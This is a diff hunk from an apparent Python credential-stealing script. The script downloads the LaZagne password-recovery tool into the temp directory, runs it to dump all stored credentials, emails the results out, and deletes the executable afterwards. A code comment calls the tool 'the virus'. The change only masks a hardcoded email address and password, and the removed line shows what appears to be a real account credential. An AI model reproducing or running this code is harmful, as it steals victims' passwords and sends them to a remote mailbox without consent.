@@ -21,6 +21,6 @@ temp_dir=tempfile.gettempdir()
 os.chdir(temp_dir)
 download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
 result=subprocess.check_output("laZagne.exe all",shell=True)
-send_mail("yuvasyuvarajan@gmail.com","yr84963051999",result)
+send_mail("y*************@gmail.com","password",result)
 #removes the virus after the work done
 os.remove("laZagne.exe")
